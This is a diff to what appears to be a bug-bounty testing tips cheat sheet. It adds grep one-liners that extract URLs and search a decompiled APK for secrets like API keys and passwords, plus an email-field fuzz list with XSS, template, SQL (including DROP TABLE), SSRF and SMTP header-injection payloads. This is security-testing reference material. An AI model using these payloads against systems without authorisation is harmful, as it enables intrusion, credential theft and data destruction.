@@ -9,6 +9,9 @@ Use OpenSSL to get certificates. They can contain valuable info and common names
 Try to recreate data from deleted accounts by siging up with the old email address.
 Check text version of HTML e-mail for template injections
 When testing Rails Application add .json to url endpoints.
+cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
+curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"* 
+grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
 ```
 
 # Tools
@@ -49,8 +52,23 @@ Login to site using Facebook and try tochange userid during POST requests
 /api/v1/users/profile?id=MYID&id=ANOTHERUSERID -> HTTP 200 
 ```
 
+# Email Adress input fuzz
+```
+test+(<script>alert(1)</script>)@example.com
+test@example(<script>alert(1)</script>).com
+"<script>alert(1)</script>"@example.com
 
+"<%=7*7%>"@example.com
+test+(${{7*7}})@example.com
 
+"'OR 1=1--"@example.com
+"mail');DROP TABLE users;--"@example.com
 
+test@example.burpcollaborator.net
+test@[127.0.0.1]
 
+victim&email=attacker@example.com
+
+"%0d%0aContent-Lenght:%200@0d%0a%0d%0a"@example.com"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
+```
 
